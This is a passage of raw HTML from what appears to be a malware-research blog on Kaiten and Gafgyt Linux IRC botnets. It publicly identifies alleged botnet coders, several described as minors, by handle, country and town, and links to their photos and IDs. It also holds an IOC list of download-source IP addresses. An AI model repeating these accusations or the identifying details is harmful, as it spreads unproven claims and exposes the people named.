href=\"https:\/\/lh3.googleusercontent.com\/-8UwItdxl9ZM\/Vwysn3prewI\/AAAAAAAAUpg\/78devxjmyAYAkDf7lkWe7LksoOmik1V-QCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8UwItdxl9ZM\/Vwysn3prewI\/AAAAAAAAUpg\/78devxjmyAYAkDf7lkWe7LksoOmik1V-QCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-RFKN6TAXNIM\/VfBHGMVMDwI\/AAAAAAAATLU\/1GuR9R0XKogv9tp4T_K7YBYESPFZsoDxwCCo\/s580-Ic42\/000.png\u003EThen please ask yourself, how many anti virus that can work in overall platform aimed by these malware? The most effective protection scheme is filtration out-f-the-box for this threat,\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-JA5JOusc_r4\/Vw912joCg-I\/AAAAAAAAUtU\/de71yPtpHww7ffSCdL1fz3b5Qs8USmYvQCLcB\/2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-JA5JOusc_r4\/Vw912joCg-I\/AAAAAAAAUtU\/de71yPtpHww7ffSCdL1fz3b5Qs8USmYvQCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EI think this additional section is explaining much of worries due to this type of malware for the present and the future. We are ignoring a simple code, and laugh about it. And becoming weak by our ignorant\/arrogant attitude. DO NOT under estimate any threat. Bad people are always lurking us, and they are learning our weakness well. I bet they read this post and try to comprehend this writing more than good people would too.   \u003Cp\u003EIn the recent hack using tsunami\/kaiten case, some researchers laugh about the actor was using tsunami as backdoor. I feel sad reading that. Again, that is an unnecessary arrogance. If you can laugh and think is that \"easy\", then go and get the actual bad guy's ID from the trace of its backdoor then, which is actually way too difficult actually under the scheme described above. \u003Cp\u003EThis is what the bad guys are actually thinking while choosing ELF\/Tsunami tool; \u003Ci\u003E\"Who will need a \"savvy\" backdoor if a simple IRC botnet code can do the job well?\"\u003C\/i\u003E \u003Cp\u003E\u003Ch2\u003EWho used or coded such malware? The h\u003Cb\u003E\"E\"\u003C\/b\u003Ecktivists? No, these are kids!\u003C\/h2\u003E \u003Cp\u003EI am in purpose disclosed publicly the coders and users of kaiten and STD bot, since they are doing their  malicious activities opoenly in twitter platform as his one communication tool between crooks.. the same platform that we have our family use and communicate with friends. You should know this.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xLMAs6apzwc\/Vw2UFeObzeI\/AAAAAAAAUqA\/KtNSeNMa1fkYwwc9PCttq5lNoMviCx7OwCLcB\/s1120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xLMAs6apzwc\/Vw2UFeObzeI\/AAAAAAAAUqA\/KtNSeNMa1fkYwwc9PCttq5lNoMviCx7OwCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003Ebelow is the disclosure details: \u003Cp\u003EOZN, the Canadian kid punk (\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-dVGXmmbELlc\/VyWq6fvwmPI\/AAAAAAAAU4U\/hJ9X789fLLcNPwzYodwJPmhZl8dm1C1lQCLcB\/s5120\/ozn2.PNG\"\u003EOuch!\u003C\/a\u003E) who coded some kaiten basis botnet and herders of thousands: \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E.\u003Ca href=\"https:\/\/twitter.com\/conscripting\"\u003E@conscripting\u003C\/a\u003E and BTW your latest \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E ktx are just lame, BOY \u003Ca href=\"https:\/\/t.co\/MnpfO6tcn7\"\u003Ehttps:\/\/t.co\/MnpfO6tcn7\u003C\/a\u003E\u003Ca href=\"https:\/\/t.co\/OkSvTAChVR\"\u003Ehttps:\/\/t.co\/OkSvTAChVR\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/OqebdXGB9J\"\u003Epic.twitter.com\/OqebdXGB9J\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/699173087971913729\"\u003EFebruary 15, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EHere\u0026#39;s the kaiten(tsunami) STD \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E coder\u0026#39;s skiddy profile logged:\u003Ca href=\"http:\/\/bit.ly\/1VkB3Ov\"\u003Ehttp:\/\/bit.ly\/1VkB3Ov\u003C\/a\u003E\u003Ca href=\"https:\/\/t.co\/sMm8eND473\"\u003Ehttps:\/\/t.co\/sMm8eND473\u003C\/a\u003E\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/699462123290644481\"\u003EFebruary 16, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ESelling \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E in \u003Ca href=\"https:\/\/twitter.com\/twitter\"\u003E@twitter\u003C\/a\u003E isn\u0026#39;t nice \u003Ca href=\"https:\/\/twitter.com\/Support\"\u003E@Support\u003C\/a\u003E\/\u003Ca href=\"https:\/\/twitter.com\/safety\"\u003E@safety\u003C\/a\u003E doesn\u0026#39;t like ppl like \u003Ca href=\"https:\/\/twitter.com\/conscripting\"\u003E@conscripting\u003C\/a\u003E to spread \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/AYxZbLS3k4\"\u003Epic.twitter.com\/AYxZbLS3k4\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/699389185602400256\"\u003EFebruary 16, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E.\u003Ca href=\"https:\/\/twitter.com\/conscripting\"\u003E@conscripting\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/twitter\"\u003E@twitter\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/Support\"\u003E@Support\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/safety\"\u003E@safety\u003C\/a\u003E thou shalt not lie (pic) :-)\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E! \u003Ca href=\"https:\/\/t.co\/fg5xUuzzM3\"\u003Epic.twitter.com\/fg5xUuzzM3\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/699405773428764672\"\u003EFebruary 16, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThis is the coder's picture: \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ESo.. this is OZN.. the \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/botnet?src=hash\"\u003E#botnet\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ddos?src=hash\"\u003E#ddos\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E coder..tsk tsk \u003Cbr\u003ERef: \u003Ca href=\"http:\/\/bit.ly\/1VkB3Ov\"\u003Ehttp:\/\/bit.ly\/1VkB3Ov\u003C\/a\u003E\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MMD?src=hash\"\u003E#MMD\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/Ga4L4XPvpr\"\u003Epic.twitter.com\/Ga4L4XPvpr\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/703499218430722048\"\u003EFebruary 27, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EThis coder is Canadian citizen (\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-T3k6Sd9Pmw8\/Vzs8WHIP5WI\/AAAAAAAAVMo\/8iXUPe2xIvoOMkP4hvOpxb-BoA2XnK6tACLcB\/s3120\/StipidOZN.PNG\"\u003EOuchh!\u003C\/a\u003E), a kid, his ID, location, real name and evidence related his activity on new DDoS activity in \"Shenron Stresser\" (\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-o9Hqd_k33R0\/VyWwIVsHlbI\/AAAAAAAAU40\/8GE7WdFn0hooUL5jFpknOJcwhucP5CQfwCLcB\/s5120\/009d.PNG\"\u003EOuch!\u003C\/a\u003E) which its environment has already reported to the law enforcement. If you still think THIS--\u003E(\u003Ca href=\"https:\/\/justpaste.it\/t9l2\"\u003Elink\u003C\/a\u003E) kid is innocent, see the captured communication below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-pJnrhIXpMYE\/Vw9xg3_IYTI\/AAAAAAAAUtI\/E17pPbTgzigiU7ABiE0lKcBeAV0JK0SpgCLcB\/s2120\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-pJnrhIXpMYE\/Vw9xg3_IYTI\/AAAAAAAAUtI\/E17pPbTgzigiU7ABiE0lKcBeAV0JK0SpgCLcB\/s580\/005.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThe customers of this coder are the actors who distribute those malware into hacked routers\/IoT\/VPS\/servers for the DDoS attack cannons. One of the \"customer is still active EVEN TODAY, a Netherlands punk-boy \"AntiChrist (aka: Reverser\/NoHacker\/Nixman(+his some avtive handle names in twitter)\" [LINK for report =\u003E \u003Ca href=\"http:\/\/x.malwaremustdie.org\/stat\/antichrist.html\"\u003EHERE\u003C\/a\u003E and \u003Ca href=\"https:\/\/pastebin.com\/XbH0FCyg\"\u003EHERE\u003C\/a\u003E] known as the lizard DDOS stresser admin [Proof =\u003E \u003Ca href=\"https:\/\/pastebin.com\/raw\/nweQVfN6\"\u003EHERE\u003C\/a\u003E] , one of the lizard (read: loonies) squad hacker gang activists, responsible for many DDOS attack efforts and hacking incidents.  \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EEven \u003Ca href=\"https:\/\/twitter.com\/hashtag\/NOW?src=hash\"\u003E#NOW\u003C\/a\u003E this \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Netherlands?src=hash\"\u003E#Netherlands\u003C\/a\u003E kid is attacking us w\/\u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E:\u003Ca href=\"https:\/\/t.co\/dhZSROnYe5\"\u003Ehttps:\/\/t.co\/dhZSROnYe5\u003C\/a\u003E\u003Ca href=\"https:\/\/twitter.com\/Politie\"\u003E@Politie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/EC3Europol\"\u003E@EC3Europol\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/AntiBotnet\"\u003E@AntiBotnet\u003C\/a\u003E \u003Ca href=\"http:\/\/bit.ly\/1ScBkCm\"\u003Ehttp:\/\/bit.ly\/1ScBkCm\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/703618666332442624\"\u003EFebruary 27, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-irKiAgPTqtc\/Vw2YQgLCCnI\/AAAAAAAAUqQ\/Ica8jdqI3j0zuDz8UM8jW_Au5aaWv4oLQCLcB\/s580\/Capture.PNG\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-g9WPR9Pvyp8\/VyWluHNjjXI\/AAAAAAAAU4A\/QiLC7ZZdqGookH659thJ5TBS_6ndTil3wCLcB\/s4120\/AntiChristPic2.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-q1n58YVCsx4\/Vyb_jpagkaI\/AAAAAAAAU54\/aqX6pnjo-B8kwdfVfhbvEOTaERDbqOH6ACLcB\/s375\/003.PNG\u003E\u003C\/a\u003E \u003Cp\u003EAnother botnet coder--\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/702756500943478784\"\u003Ehere\u003C\/a\u003E, and a kaiten bot herder--\u003E\u003Ca href=\"https:\/\/twitter.com\/intent\/user?user_id=3313223540\"\u003Ehere\u003C\/a\u003E, and then a user\/actor--\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/702517058563502080\"\u003Ehere\u003C\/a\u003E, and his comrade actor--\u003E\u003Ca href=\"http:\/\/imgur.com\/a\/S8rmd\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003EAnd also another IRC ELF malware herder using kaiten, if you see the above picture--\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Z8C5Kw9RlWc\/VySX7ezIq1I\/AAAAAAAAU04\/ZcFLsCIKf1s19cOvbujcibmUQTKlvvFSgCLcB\/s2580\/1005.PNG\"\u003Ehere\u003C\/a\u003E ..well, this is the guy responsible, his botnet ELF payloads is known well with the \"BLJ\" or \"Dongs\" initial..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NZs1Ddp2cG4\/Vyb9ZGL1JzI\/AAAAAAAAU5s\/3u9dmalyfEguRognJqHyc0QtC1eg2EGTwCLcB\/s2269\/002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NZs1Ddp2cG4\/Vyb9ZGL1JzI\/AAAAAAAAU5s\/3u9dmalyfEguRognJqHyc0QtC1eg2EGTwCLcB\/s580\/002.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EI think many ELF malware researchers seeing this type already too :-)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-FuER5gF9jxY\/VySjgt2pFCI\/AAAAAAAAU1I\/G1aLaG_dG_McL3B8VVg_n3AbacgHB3uBQCLcB\/s2119\/1006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-FuER5gF9jxY\/VySjgt2pFCI\/AAAAAAAAU1I\/G1aLaG_dG_McL3B8VVg_n3AbacgHB3uBQCLcB\/s580\/1006.png\u003E\u003C\/a\u003E\u003Cbr\u003EPlease note the description of \"Security Enthusiast\", or \"Developer\" is used in his profile, as many of other skiddos used to use such \"Reverser\", \"Malware Analyst\/Researcher\" and \"Security Beginner\" attributes. FYI: Clodflare service is the heaven for these punks to park, AntiDDoS service used by DDoSer..what an irony..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Zzf5u-2IjB0\/VycBO2S3pRI\/AAAAAAAAU6E\/TV9UF05I0q016nd_vQ6ltlzT7zqFzDi1wCLcB\/s4109\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Zzf5u-2IjB0\/VycBO2S3pRI\/AAAAAAAAU6E\/TV9UF05I0q016nd_vQ6ltlzT7zqFzDi1wCLcB\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E..by the way, talking about Cloudflare was used protecting DDoS attacker service, see below↓\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-svvFG0wdKdI\/VycEHFFAsFI\/AAAAAAAAU6Q\/gEqcmCKUogkpgYSc9SZf--qdNoOURSKJACLcB\/s3120\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-svvFG0wdKdI\/VycEHFFAsFI\/AAAAAAAAU6Q\/gEqcmCKUogkpgYSc9SZf--qdNoOURSKJACLcB\/s580\/005.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThese kids are showing off openly of what they are doing in herding their botnets, like the one with the twitter profile below:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-s2MVz_X8KA4\/Vw2gHPiDfFI\/AAAAAAAAUqk\/0cFlpg8zDx45_SdtAQmXRkZVKFea8w3dgCLcB\/s480\/Capture.PNG\u003E\u003Cbr\u003E↑This UK boy (from Ballymena city) is showing off in his twitter profile (\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-TiRORGY1Hrc\/VyWtS8kW3_I\/AAAAAAAAU4g\/MgEsQmWnrAgFXfVcsyaETVBjoZRb3mQAgCLcB\/s4120\/009c.PNG\"\u003EOuch!!\u003C\/a\u003E) the ELF botnets entering the CNC of IRC server actually, let's see that picture in close up:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WU08Xi1wTWw\/Vw2g9R_nLFI\/AAAAAAAAUqs\/FVsgAYA24cszWXP45jKvm2g369Ro0mErACLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WU08Xi1wTWw\/Vw2g9R_nLFI\/AAAAAAAAUqs\/FVsgAYA24cszWXP45jKvm2g369Ro0mErACLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EIt is showing the multiplatform ELF Linux malware botnet client malware that successfully infected the target and making a callback to the IRC botnet server, it is showed clearly with the name of platform sent via the chat protocol shown in the picture as ARM, MIPS, SH, etc. You will be very surprised if you see how young the picture of this kid is..  \u003Cp\u003EOne more skiddos, a young boy from US, even openly use GitHub and PasteBin for his own developed code to DDoS, hack BusyBox routers\/IoTs, and other offensive codes:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WQZg0lcuzA0\/VyWa_VS71PI\/AAAAAAAAU3M\/HG4QspHYAxYf5fZ5EQzTojKgit5UvTeawCLcB\/s3120\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WQZg0lcuzA0\/VyWa_VS71PI\/AAAAAAAAU3M\/HG4QspHYAxYf5fZ5EQzTojKgit5UvTeawCLcB\/s580\/006.png\u003E\u003C\/a\u003E\u003Cbr\u003EDon't ever believe if was said such codes (see below) are used for the \"research\" purpose..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qYGsODzAfkM\/VyWa_g627jI\/AAAAAAAAU3Q\/BILVDiWOFLkAoe9CP4SuMJXGZaXKvk_egCLcB\/s3120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qYGsODzAfkM\/VyWa_g627jI\/AAAAAAAAU3Q\/BILVDiWOFLkAoe9CP4SuMJXGZaXKvk_egCLcB\/s580\/007.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe actor's information is as per below, pic can be seen here--\u003E\u003Ca href=\"https:\/\/youtu.be\/z375e97Erz4\"\u003EOuch!\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-_3nlfEtmr3o\/VyWg7F2zEPI\/AAAAAAAAU3k\/uNvz3H0wFDA0rgmFXVtiLX2q0XRLN4-FQCLcB\/s2269\/008.JPG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_3nlfEtmr3o\/VyWg7F2zEPI\/AAAAAAAAU3k\/uNvz3H0wFDA0rgmFXVtiLX2q0XRLN4-FQCLcB\/s580\/008.JPG\u003E\u003C\/a\u003E \u003Cp\u003E...and we have nailed ID of more actors (i.e. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-_o8WFVfRybE\/VyWigJHqEaI\/AAAAAAAAU30\/gx-vqGlYji4SiRDzhVZrPdaFKORcVOsuQCLcB\/s2220\/009.JPG\"\u003EOuch!\u003C\/a\u003E) (we counted 12+ more ID data are successfully collected now). The majority of these actors are kids \"gone wild\". Their parents are not controlling (nor caring) to what they are doing anymore, and they think if they cover their traces well the law can not touch them since they are only a (masked) \u003Cb\u003E\u003Ci\u003E\"naive young children\"\u003C\/i\u003E\u003C\/b\u003E.  \u003Cp\u003E\u003Ch2\u003EFor the IOC The report of infection from 1st Jan - Feb 7th 2016 (warning: it is outdated)\u003C\/h2\u003E   \u003Cp\u003E1. The summary: \u003Cpre\u003EMalware binary types: ELF\/multiple architecture\u003Cbr \/\u003EMalware type: GayFgt(LizKebab), Kaiten (STD\/Mod)\u003Cbr \/\u003ESuspected actors: Lizard Stresser rings, aka: Sindicate, \"Loony\" Squad, and so on.\u003Cbr \/\u003ETotal attempts: 1,158\u003Cbr \/\u003EMain download method: wgxt\u003Cbr \/\u003EAlternative download: cuxl; xxtch ; xxx-xxwnload\u003Cbr \/\u003EDownload source per country:\u003Cbr \/\u003E  ------------------------\u003Cbr \/\u003E  No  Country      Count\u003Cbr \/\u003E  ------------------------\u003Cbr \/\u003E  1.  United States  39\u003Cbr \/\u003E  2.  Netherlands    12\u003Cbr \/\u003E  3.  United Kingdom 4\u003Cbr \/\u003E  4.  Latvia         3\u003Cbr \/\u003E  5.  France         3\u003Cbr \/\u003E  6.  Ukraine        1\u003Cbr \/\u003E  7.  Romania        1\u003Cbr \/\u003E  8.  Singapore      1\u003Cbr \/\u003E  9.  Poland         1\u003Cbr \/\u003E  10. Sweden         1\u003Cbr \/\u003E  11. China          1\u003Cbr \/\u003E  12. Russian        1\u003Cbr \/\u003E  13. Germany        1\u003Cbr \/\u003E  14. Moldova        1\u003Cbr \/\u003E\u003C\/pre\u003E 2. Interactive Map: \u003Cp\u003E\u003Cscript type=\"text\/javascript\" src=\"http:\/\/www.google.com\/jsapi\"\u003E\u003C\/script\u003E\u003Cscript type=\"text\/javascript\"\u003E    google.load('visualization', '1', {packages: ['geomap']}); \u003C\/script\u003E\u003Cscript type=\"text\/javascript\"\u003E    function drawVisualization() {     \/\/ Create and populate the data table.     var data = new google.visualization.DataTable();     data.addColumn('string', '', 'Country');     data.addColumn('number', 'Hosts');     data.addRows(13);    data.setValue(0, 0, 'MD');     data.setValue(0, 1, 1);     data.setValue(1, 0, 'FR');     data.setValue(1, 1, 3);     data.setValue(2, 0, 'NL');     data.setValue(2, 1, 12);     data.setValue(3, 0, 'CN');     data.setValue(3, 1, 1);     data.setValue(4, 0, 'RU');     data.setValue(4, 1, 1);     data.setValue(5, 0, 'UA');     data.setValue(5, 1, 1);     data.setValue(6, 0, 'DE');     data.setValue(6, 1, 1);     data.setValue(7, 0, 'US');     data.setValue(7, 1, 39);     data.setValue(8, 0, 'GB');     data.setValue(8, 1, 4);     data.setValue(9, 0, 'SE');     data.setValue(9, 1, 1);     data.setValue(10, 0, 'RO');     data.setValue(10, 1, 1);     data.setValue(11, 0, 'SG');     data.setValue(11, 1, 1);     data.setValue(12, 0, 'PL');     data.setValue(12, 1, 1);      var geomap = new google.visualization.GeoMap(document.getElementById('geo_map'));     var options = {width:'580', height:'320'};     geomap.draw(data, options);     }     google.setOnLoadCallback(drawVisualization); \u003C\/script\u003E\u003Cdiv id=\"geo_map\" style=\"width: 580px; height: 320px;\"\u003Ea\u003C\/div\u003E\u003Cbr \/\u003E\u003Ci\u003EPowered by my friend's (JC SoCal's cool GIPC)\u003C\/i\u003E \u003Cp\u003E3. CSV GeoIP Database: \u003Cpre class=\"brush: text\"\u003E\u003Cbr \/\u003E107.172.23.133, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E158.69.205.212, Pasadena, 91124, United States, 33.7866, -118.2987\u003Cbr \/\u003E158.69.217.211, Pasadena, 91124, United States, 33.7866, -118.2987\u003Cbr \/\u003E162.208.8.203, Glenview, 60025, United States, 42.0855, -87.8247\u003Cbr \/\u003E162.213.195.144, Austin, 78751, United States, 30.3106, -97.7227\u003Cbr \/\u003E163.47.11.201, Singapore, - , Singapore, 1.2931, 103.8558\u003Cbr \/\u003E173.208.196.202, Kansas City, 64106, United States, 39.1068, -94.566\u003Cbr \/\u003E173.214.160.90, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E173.242.119.122, Clarks Summit, 18411, United States, 41.4486, -75.728\u003Cbr \/\u003E176.123.29.105, Chisinau, - , Moldova Republic of, 47.0056, 28.8575\u003Cbr \/\u003E178.19.111.244, Tarnowskie Gory, 42-600, Poland, 50.4485, 18.8515\u003Cbr \/\u003E185.112.249.111, Coventry, CV1, United Kingdom, 52.4167, -1.55\u003Cbr \/\u003E185.112.249.253, Coventry, CV1, United Kingdom, 52.4167, -1.55\u003Cbr \/\u003E185.112.249.26, Coventry, CV1, United Kingdom, 52.4167, -1.55\u003Cbr \/\u003E185.130.5.200, - , - , - , Latvia, Lithuania, 56.00, 24.00\u003Cbr \/\u003E185.130.5.205, - , - , - , Latvia, Lithuania, 56.00, 24.00\u003Cbr \/\u003E185.130.5.246, - , - , - , Latvia, Lithuania, 56.00, 24.00\u003Cbr \/\u003E185.17.30.239, - , - , Russian Federation, 55.75, 37.6166\u003Cbr \/\u003E185.29.9.253, Stockholm, 173 11, Sweden, 59.3333, 18.05\u003Cbr \/\u003E185.52.2.114, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E185.62.189.11, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E185.62.190.156, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E185.62.190.253, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E185.62.190.62, - , - , Netherlands, 52.3667, 4.9\u003Cbr \/\u003E192.227.170.67, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E192.227.177.120, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E192.227.177.127, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E192.243.109.128, Glenview, 60025, United States, 42.0855, -87.8247\u003Cbr \/\u003E192.243.109.5, Glenview, 60025, United States, 42.0855, -87.8247\u003Cbr \/\u003E198.12.97.67, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E198.12.97.93, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E198.23.238.203, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E198.23.238.215, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E198.23.238.251, Buffalo, 14221, United States, 42.9864, -78.7279\u003Cbr \/\u003E199.180.133.178, Kansas City, 64106, United States, 39.1068, -94.566\u003Cbr \/\u003E199.180.133.214, Kansas City, 64106, United States, 39.1068, -94.566\u003Cbr \/\u003E199.231.184.237, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E206.72.207.194, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E208.67.1.142, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.165, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.2, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.3, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.40, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.52, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.73, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.67.1.88, Kansas City, 64116, United States, 39.1472, -94.5735\u003Cbr \/\u003E208.73.207.236, Secaucus, 07094, United States, 40.7801, -74.0633\u003Cbr \/\u003E208.89.211.111, Kansas City, 64106, United States, 39.1068, -94.566\u003Cbr \/\u003E208.89.211.141, Kansas City, 64106, United States, 39.1068, -94.566\u003Cbr 